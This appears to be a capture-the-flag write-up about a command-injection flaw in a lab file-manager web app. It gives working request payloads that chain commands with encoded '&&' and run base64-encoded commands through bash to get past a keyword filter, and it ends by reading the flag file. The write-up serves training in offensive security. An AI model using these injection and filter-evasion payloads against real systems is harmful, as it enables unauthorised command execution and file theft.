After navigating to the provided IP address, I was presented with a login form. 
![image](https://github.com/user-attachments/assets/8f63b8e7-44c3-459e-9468-332e2290d76e)

Using the credentials guest for both the username and password, I successfully logged in and accessed the main interface of the application. 
![image](https://github.com/user-attachments/assets/bf60fa83-7a6b-47c7-993e-f9a1d669be58)

The dashboard displayed a list of files, each with multiple available actions: **View, Copy to, Direct Link, and Download**. There was also an **Advanced Search** feature. Screenshots of the interface are included below for reference. This initial exploration helped me understand how the web application handled file operations, which later played a key role in identifying command injection points and exploiting them to retrieve the target flag.

Each action triggered specific HTTP GET requests, and by analyzing how the to, from, and move parameters behaved, I started mapping how file operations were executed on the backend. 

### View
```bash
GET /index.php?to=&view=51459716.txt&quickView=1
```
![image](https://github.com/user-attachments/assets/bdc65f98-b252-47f3-a07b-1515a7ef36d5)

### Copy to
```bash
GET /index.php?to=&from=51459716.txt
```
![image](https://github.com/user-attachments/assets/19de108f-c090-464c-823e-9566108aaa5b)

### Direct Link
```bash
GET /51459716.txt
```
![image](https://github.com/user-attachments/assets/b83b42fe-3c22-450e-8034-b638a8cc5615)

### Download
```bash
GET /index.php?to=&dl=51459716.txt
```
![image](https://github.com/user-attachments/assets/b2b95793-2c9b-42cd-ace5-1cf5ae02dba7)

### Advance Search
```bash
POST /index.php?to= HTTP/1.1
SNIP...
ajax=true&content=have&path=.&type=search
```
![image](https://github.com/user-attachments/assets/6873e2e7-139e-45b3-ac5b-dab7f9a283d1)

Initially, attempts to execute commands directly such as `whoami` through either `to=` or `from=` parameters were denied, returning the message **"Malicious request denied."**

**whoami in to**
![image](https://github.com/user-attachments/assets/2d4c5af4-8740-4b8d-9aeb-bd4ef6eb49d6)

**whoami in from**
![image](https://github.com/user-attachments/assets/26105475-ad8d-415e-bdf3-57f711723319)

I tried with other injections commands.
![image](https://github.com/user-attachments/assets/2b26095f-76c4-4fc0-9f17-7af93f1fccb6)

![image](https://github.com/user-attachments/assets/c3e50e94-e288-420d-b846-8d04959c3554)

Through experimentation, it was discovered that the server accepted the  `%26%26` operator when injected in parameters, suggesting the backend command execution might be happening via the `mv` command. This was a valuable clue for chaining shell commands.
![image](https://github.com/user-attachments/assets/0099502c-8cad-4002-b6e5-7d93fd12c090)

Again doing GET /index.php?to=&from=51459716.txt%26%26whoami&finish=1&move=1;whoami gave me the same error

![image](https://github.com/user-attachments/assets/e8fec73e-719a-41f5-9bec-e10ae712f2cd)

To bypass these filters, I base64-encoded the command strings to obfuscate them. For example, I encoded whoami using `echo -n "whoami" | base64`, resulting in `d2hvYW1p`. I then used the following crafted request to attempt execution: 

![image](https://github.com/user-attachments/assets/237a083a-79b4-48e4-9399-f7c548d7404c)

And used that command as follows:
```bash
GET /index.php?to=&from=51459716.txt%26%26bash<<<$(base64%09-d<<<"d2hvYW1p")&finish=1&move=1;whoami
```
![image](https://github.com/user-attachments/assets/ef55853b-7647-4ee1-9a0b-27ff212b06cb)

Now changed payload `from` to `to` parameter.
```bash
GET /index.php?to=tmp%26%26bash<<<$(base64%09-d<<<"d2hvYW1p")&from=51459716.txt&finish=1&move=1;whoami
```
![image](https://github.com/user-attachments/assets/39cdbdde-f258-4a1a-8644-87423aa8e6dc)

When I used the payload, the previous file gets moved from the list, so we have to regularly update file names in each steps.
```bash
GET /index.php?to=tmp%26%26bash<<<$(base64%09-d<<<"d2hvYW1p")&from=605311066.txt&finish=1&move=1
```
![image](https://github.com/user-attachments/assets/528ca51f-943f-4ce8-b3e8-867de6894acf)

Again to find the list I used `ls -la` command but used base64 here as well. 
```bash
echo -n "ls -la" | base64
```                  
![image](https://github.com/user-attachments/assets/41986360-ba2b-4f29-b035-6c131ffb13a9)

Now using the payload with the above base64 output. 
GET /index.php?to=tmp%26%26bash<<<$(base64%09-d<<<"bHMgLWxh")&from=787113764.txt&finish=1&move=1
![image](https://github.com/user-attachments/assets/8ca9801c-e87b-4e08-b91c-7e0109704609)

After finding the list, now time to use base64 of flag.txt and here i can't directly use cat flag.txt so again use base64.
```bash
echo -n "cat ${PATH:0:1}flag.txt" | base64
```
![image](https://github.com/user-attachments/assets/bef58e53-7716-4a50-b2b0-518f660f5d48)

Finally, after using the payload, got the flag.
GET /index.php?to=tmp%26%26bash<<<$(base64%09-d<<<"Y2F0IC9mbGFnLnR4dA==")&from=877915113.txt&finish=1&move=1
![image](https://github.com/user-attachments/assets/aac33350-f1eb-404a-8826-eb44861d12cd)

